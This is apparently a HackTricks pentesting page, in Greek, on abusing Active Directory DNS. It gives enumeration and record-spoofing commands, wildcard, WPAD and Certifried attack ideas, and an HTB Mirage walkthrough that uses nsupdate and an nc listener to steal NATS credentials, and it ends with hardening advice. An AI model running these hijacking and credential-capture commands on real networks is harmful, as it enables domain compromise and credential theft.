# Εγγραφές DNS του AD

{{#include ../../banners/hacktricks-training.md}}

Από προεπιλογή, **οποιοσδήποτε χρήστης** στο Active Directory μπορεί να κάνει **enumerate όλα τα DNS records** στις DNS zones του Domain ή του Forest, παρόμοια με ένα zone transfer (οι χρήστες μπορούν να παραθέσουν τα child objects μιας DNS zone σε περιβάλλον AD).

Το εργαλείο [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) επιτρέπει το **enumeration** και το **export** **όλων των DNS records** στη zone, για σκοπούς recon σε εσωτερικά δίκτυα.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Απρίλιος 2025) προσθέτει έξοδο JSON/Greppable (`--json`), DNS resolution με multi-threading και υποστήριξη για TLS 1.2/1.3 κατά τη σύνδεση σε LDAPS

Για περισσότερες πληροφορίες, διαβάστε [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Δημιουργία / Τροποποίηση records (ADIDNS spoofing)

Επειδή η ομάδα **Authenticated Users** έχει από προεπιλογή δικαίωμα **Create Child** στο zone DACL, οποιοσδήποτε domain account (ή computer account) μπορεί να καταχωρίσει επιπλέον records. Αυτό μπορεί να χρησιμοποιηθεί για traffic hijacking, NTLM relay coercion ή ακόμη και για πλήρες domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(Το dnsupdate.py περιλαμβάνεται στο Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Κοινά attack primitives

1. **Wildcard record** – Το `*.<zone>` μετατρέπει τον AD DNS server σε responder για ολόκληρη την enterprise, παρόμοιο με LLMNR/NBNS spoofing. Μπορεί να γίνει abuse για τη συλλογή NTLM hashes ή για relay τους σε LDAP/SMB.  (Απαιτείται η απενεργοποίηση του WINS-lookup.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – προσθέστε `wpad` (ή ένα **NS** record που δείχνει σε attacker host για την παράκαμψη του Global-Query-Block-List) και κάντε transparent proxy των outbound HTTP requests για τη συλλογή credentials. Η Microsoft διόρθωσε τα wildcard/ DNAME bypasses (CVE-2018-8320), αλλά τα **NS-records εξακολουθούν να λειτουργούν**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – διεκδικήστε τη διεύθυνση IP που ανήκε προηγουμένως σε ένα workstation και το σχετικό DNS entry θα εξακολουθεί να γίνεται resolve, επιτρέποντας resource-based constrained delegation ή Shadow-Credentials attacks χωρίς καμία αλληλεπίδραση με το DNS.
4. **DHCP → DNS spoofing** – σε ένα default Windows DHCP+DNS deployment, ένας unauthenticated attacker στο ίδιο subnet μπορεί να overwrite οποιοδήποτε υπάρχον A record (συμπεριλαμβανομένων των Domain Controllers), στέλνοντας forged DHCP requests που ενεργοποιούν dynamic DNS updates (Akamai “DDSpoof”, 2023). Αυτό παρέχει machine-in-the-middle πάνω από Kerberos/LDAP και μπορεί να οδηγήσει σε πλήρες domain takeover.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – αλλάξτε το `dNSHostName` ενός machine account που ελέγχετε, κάντε register ένα matching A record και, στη συνέχεια, ζητήστε certificate για αυτό το όνομα ώστε να κάνετε impersonate το DC. Εργαλεία όπως τα **Certipy** ή **BloodyAD** αυτοματοποιούν πλήρως τη διαδικασία.

---

### Hijacking εσωτερικών services μέσω stale dynamic records (NATS case study)

Όταν τα dynamic updates παραμένουν ανοιχτά σε όλους τους authenticated users, ένα **de-registered service name μπορεί να γίνει re-claimed και να δείχνει σε attacker infrastructure**. Το Mirage HTB DC εξέθεσε το hostname `nats-svc.mirage.htb` μετά το DNS scavenging, επομένως οποιοσδήποτε low-privileged user μπορούσε:<sup>[[3]](#references)</sup>

1. **Επιβεβαιώσει ότι λείπει το record** και να εντοπίσει το SOA με το `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Επαναδημιουργήστε την εγγραφή** προς ένα εξωτερικό/VPN interface που ελέγχουν:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Μιμηθείτε την υπηρεσία plaintext**. Οι clients του NATS αναμένουν να δουν ένα banner `INFO { ... }` πριν στείλουν credentials, επομένως η αντιγραφή ενός νόμιμου banner από τον πραγματικό broker αρκεί για τη συλλογή secrets:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client που επιλύει το hijacked όνομα θα κάνει αμέσως leak το JSON `CONNECT` frame (συμπεριλαμβανομένων των `"user"`/`"pass"`) στον listener. Η εκτέλεση του επίσημου binary `nats-server -V` στο host του attacker, η απενεργοποίηση του log redaction ή απλώς η παρακολούθηση του session με Wireshark αποκαλύπτει τα ίδια plaintext credentials, επειδή το TLS ήταν optional.

4. **Pivot with the captured creds** – στο Mirage, το κλεμμένο NATS account παρείχε πρόσβαση στο JetStream, η οποία αποκάλυψε ιστορικά authentication events που περιείχαν επαναχρησιμοποιήσιμα AD usernames/passwords.

Αυτό το pattern εφαρμόζεται σε κάθε AD-integrated service που βασίζεται σε μη ασφαλή TCP handshakes (HTTP APIs, RPC, MQTT κ.λπ.): μόλις γίνει hijack του DNS record, ο attacker γίνεται το service.

---

## Detection & hardening

* Αφαίρεσε από τους **Authenticated Users** το δικαίωμα *Create all child objects* σε sensitive zones και ανάθεσε τα dynamic updates σε ένα dedicated account που χρησιμοποιείται από το DHCP.
* Αν απαιτούνται dynamic updates, ρύθμισε τη zone σε **Secure-only** και ενεργοποίησε το **Name Protection** στο DHCP, ώστε μόνο το owner computer object να μπορεί να overwrite το δικό του record.
* Παρακολούθησε τα DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) και τα LDAP writes προς `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Κάνε block στα dangerous names (`wpad`, `isatap`, `*`) με ένα intentionally-benign record ή μέσω του Global Query Block List.
* Διατήρησε τους DNS servers patched – για παράδειγμα, τα RCE bugs CVE-2024-26224 και CVE-2024-26231 έφτασαν το **CVSS 9.8** και είναι remotely exploitable εναντίον Domain Controllers.

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
